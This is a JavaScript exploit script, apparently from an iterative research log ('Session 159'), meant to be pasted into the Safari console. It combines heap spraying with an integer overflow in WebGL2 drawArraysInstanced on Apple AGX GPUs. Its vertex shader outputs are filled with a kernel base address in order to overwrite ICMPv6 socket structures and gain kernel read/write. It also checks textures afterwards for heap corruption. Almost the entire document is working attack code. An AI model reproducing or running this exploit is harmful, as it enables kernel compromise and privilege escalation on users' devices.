/*
 * AGX Controlled Write via Vertex Varying Output — Session 159 Track B
 * =====================================================================
 * KEY INSIGHT: AGX overflow writes VERTEX VARYING OUTPUT (not zeros) to
 * adjacent kernel memory. Previous sessions used a minimal vertex shader
 * that outputs all zeros. THIS shader uses flat uvec4 varyings with
 * CONTROLLED INTEGER VALUES encoding a fake in6pcb structure.
 *
 * Target: kalloc.icmp6pcb = 168-byte in6pcb_t for ICMPv6 sockets
 *         Field in6p_icmp6filt (offset TBD, likely ~0x80-0x90) is a
 *         POINTER to the 32-byte filter. Overwrite → kernel R/W.
 *
 * The fake in6pcb we want to write (168 bytes = 42 × 4 bytes):
 *   Bytes [0..7]:   inp_socket back-ptr → 0 (try zero first)
 *   Bytes [8..15]:  in6p_icmp6filt ptr  → kernel_base (0xfffffe004d928000)
 *                   If getsockopt ICMP6_FILTER reads from this → R/W proven
 *   Bytes [16..167]: zeros
 *
 * We use flat (integer) varyings to avoid float precision loss.
 * Each uvec4 = 4 × uint32 = 16 bytes. 168 bytes = ~11 uvec4s.
 * We output 42 uvec4s (672 bytes) to cover multiple adjacent icmp6pcb objects.
 *
 * After this runs, DarkSword v7 scans for:
 *   CONTROLLED_WRITE_DETECTED: socket filter bytes [8..15] match kernel_base
 *   This proves: vertex varying → kernel write → in6p_icmp6filt overwritten.
 *
 * Deploy: WebInspector → Safari console → paste this JS
 */

(function() {
    // =========================================================
    // PHASE 1: Heap spray — pressure kernel allocator
    // =========================================================
    var channels = [];
    for (var i = 0; i < 500; i++) {
        try { channels.push(new MessageChannel()); } catch(e) {}
    }
    var wsocks = [];
    for (var i = 0; i < 200; i++) {
        try {
            var ws = new WebSocket('ws://192.168.68.1:1');
            wsocks.push(ws);
        } catch(e) {}
    }
    console.log('[v7] Heap spray: ' + channels.length + ' channels, ' + wsocks.length + ' sockets');

    // =========================================================
    // PHASE 2: WebGL2 canvas + controlled vertex shader
    // =========================================================
    var oc = document.createElement('canvas');
    oc.width = 16; oc.height = 16;
    document.body.appendChild(oc);
    var gl = oc.getContext('webgl2');
    if (!gl) { console.log('[v7] NO WEBGL2'); return; }

    /*
     * Vertex shader: flat uvec4 varyings encoding fake in6pcb
     *
     * Kernel base = 0xfffffe004d928000
     * In little-endian uint32:
     *   lo32 = 0x4d928000
     *   hi32 = 0xfffffe00
     *
     * in6pcb layout (XNU bsd/netinet6/in6_pcb.h, approx iOS 26):
     *   +0x00 (8B): LIST_ENTRY head
     *   +0x08 (8B): inp_socket *   (back-ptr)
     *   +0x10 (4B): inp_flags
     *   +0x14 (4B): inp_flags2
     *   +0x18 (16B): in6_laddr (local addr)
     *   +0x28 (16B): in6_faddr (foreign addr)
     *   ... (lots of fields) ...
     *   The in6p_icmp6filt pointer is somewhere in the 168 bytes.
     *   We write kernel_base into EVERY 8-byte-aligned slot from offset 8 onward.
     *   This maximizes our chance of hitting the right field.
     *
     * uvec4 v[0]:   bytes 0..15   → 0,0,0,0 (leave head safe)
     * uvec4 v[1]:   bytes 16..31  → kern_lo,kern_hi,kern_lo,kern_hi
     * uvec4 v[2]:   bytes 32..47  → kern_lo,kern_hi,kern_lo,kern_hi
     * ...continuing every uvec4 with kernel_base in each 64-bit slot...
     * uvec4 v[10]:  bytes 160..175 → kern_lo,kern_hi,kern_lo,kern_hi
     * Then repeat for 42 total uvec4s (covers ~4 adjacent icmp6pcb objects)
     */
    var KERN_LO = 0x4d928000;
    var KERN_HI = 0xfffffe00;  // Note: uint32, not signed

    // Build uvec4 assignments string
    var assignments = '';
    for (var vi = 0; vi < 42; vi++) {
        if (vi === 0) {
            // First uvec4: zeros (preserve list head)
            assignments += '    v[0] = uvec4(0u, 0u, 0u, 0u);\n';
        } else {
            // Alternate KERN_LO/KERN_HI pairs: encodes 64-bit kernel_base in each pair
            assignments += '    v[' + vi + '] = uvec4(' +
                KERN_LO + 'u, ' + KERN_HI + 'u, ' +
                KERN_LO + 'u, ' + KERN_HI + 'u);\n';
        }
    }

    var vsSrc =
        '#version 300 es\n' +
        'flat out uvec4 v[42];\n' +
        'void main() {\n' +
        assignments +
        '    gl_Position = vec4(0.0, 0.0, 0.0, 1.0);\n' +
        '    gl_PointSize = 1.0;\n' +
        '}\n';

    var fsSrc =
        '#version 300 es\n' +
        'flat in uvec4 v[42];\n' +
        'out vec4 o;\n' +
        'void main() {\n' +
        '    // Use varying to prevent dead-code elimination\n' +
        '    float x = float(v[0].x) + float(v[1].x);\n' +
        '    o = vec4(x * 0.0000001, 0.0, 0.0, 1.0);\n' +
        '}\n';

    var vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, vsSrc);
    gl.compileShader(vs);
    if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) {
        console.log('[v7] VS compile error: ' + gl.getShaderInfoLog(vs));
        return;
    }

    var fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, fsSrc);
    gl.compileShader(fs);
    if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
        console.log('[v7] FS compile error: ' + gl.getShaderInfoLog(fs));
        return;
    }

    var prog = gl.createProgram();
    gl.attachShader(prog, vs);
    gl.attachShader(prog, fs);
    gl.linkProgram(prog);
    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
        console.log('[v7] Link error: ' + gl.getProgramInfoLog(prog));
        return;
    }
    gl.useProgram(prog);
    console.log('[v7] Shader compiled and linked OK');

    // =========================================================
    // PHASE 3: IOSurface spray — groom kernel heap
    // Spray multiple WebGL textures in kalloc.icmp6pcb-adjacent zones
    // =========================================================
    var textures = [];
    for (var i = 0; i < 200; i++) {
        try {
            var t = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, t);
            // 168 bytes ÷ 4 channels = 42 pixels → 6×7 or 7×6 texture
            gl.texStorage2D(gl.TEXTURE_2D, 1, gl.RGBA8, 6, 7);
            var px = new Uint8Array(168);
            // Mark each texture: px[0..3] = texture index
            px[0] = (i >> 24) & 0xFF;
            px[1] = (i >> 16) & 0xFF;
            px[2] = (i >> 8) & 0xFF;
            px[3] = i & 0xFF;
            // Rest: 0xBB marker
            for (var j = 4; j < 168; j++) px[j] = 0xBB;
            gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 6, 7, gl.RGBA, gl.UNSIGNED_BYTE, px);
            textures.push(t);
        } catch(e) {}
    }
    console.log('[v7] Texture spray: ' + textures.length + ' textures');

    // FBO for draw target
    var fbo = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
    var rtex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, rtex);
    gl.texStorage2D(gl.TEXTURE_2D, 1, gl.RGBA8, 16, 16);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, rtex, 0);
    gl.viewport(0, 0, 16, 16);

    // =========================================================
    // PHASE 4: Fire overflow with controlled vertex shader
    // Parameters: 256 × 16777217 = 4,294,967,552 → overflows uint32 → 256
    // GPU allocates 256 bytes but shader output covers 672 bytes × many instances
    // =========================================================
    var results = [];
    var ROUND = 0;

    function fireRound() {
        if (ROUND >= 10) {
            console.log('[v7] All 10 rounds fired. Triggering DarkSword v7 scan...');
            // Trigger DarkSword v7 via AFC file write (done by s159_delivery.py)
            // Report results
            console.log('[v7] Results: ' + JSON.stringify(results));
            // Post-overflow readback
            checkReadback();
            return;
        }

        console.log('[v7] Round ' + (ROUND+1) + '/10: firing drawArraysInstanced...');
        var t0 = performance.now();

        try {
            // Primary overflow: 256 × 16777217 → 32-bit wrap to 256
            gl.drawArraysInstanced(gl.POINTS, 0, 256, 16777217);
        } catch(e) { console.log('[v7] Round ' + ROUND + ' error: ' + e); }

        try {
            // Secondary: 1024 × 4194305 → 4096 × 1 = 4096 alloc, GPU writes 4GB
            gl.drawArraysInstanced(gl.POINTS, 0, 1024, 4194305);
        } catch(e) {}

        gl.flush();

        var dt = (performance.now() - t0).toFixed(1);
        results.push({round: ROUND+1, dt: dt});
        console.log('[v7] Round ' + (ROUND+1) + ' done in ' + dt + 'ms');
        ROUND++;

        // Slight delay between rounds to let DarkSword v7 scan
        setTimeout(fireRound, 500);
    }

    function checkReadback() {
        // Check surviving textures for corruption markers
        var corrupted = 0;
        for (var i = 0; i < textures.length && i < 50; i++) {
            try {
                var fb2 = gl.createFramebuffer();
                gl.bindFramebuffer(gl.FRAMEBUFFER, fb2);
                gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0,
                                        gl.TEXTURE_2D, textures[i], 0);
                if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) !== gl.FRAMEBUFFER_COMPLETE) {
                    corrupted++;
                    console.log('[v7] Texture ' + i + ': FRAMEBUFFER INCOMPLETE (kernel corruption)');
                    continue;
                }
                var px = new Uint8Array(168);
                gl.readPixels(0, 0, 6, 7, gl.RGBA, gl.UNSIGNED_BYTE, px);
                var expected = i & 0xFF;
                if (px[3] !== expected) {
                    corrupted++;
                    console.log('[v7] Texture ' + i + ': CORRUPTED (expected px[3]=' +
                                expected + ' got=' + px[3] + ')');
                }
            } catch(e) {}
        }
        console.log('[v7] Readback: ' + corrupted + '/' + Math.min(textures.length, 50) +
                    ' textures corrupted');
        if (corrupted > 0) {
            console.log('[v7] KERNEL HEAP CORRUPTION CONFIRMED via texture readback');
        }
    }

    // Start firing after 2s (let DarkSword v7 set up sockets)
    console.log('[v7] Starting in 2s...');
    console.log('[v7] Shader encoding kernel_base=0xfffffe004d928000 in all varyings');
    console.log('[v7] DarkSword v7 must be running to detect CONTROLLED_WRITE_DETECTED');
    setTimeout(fireRound, 2000);

})();
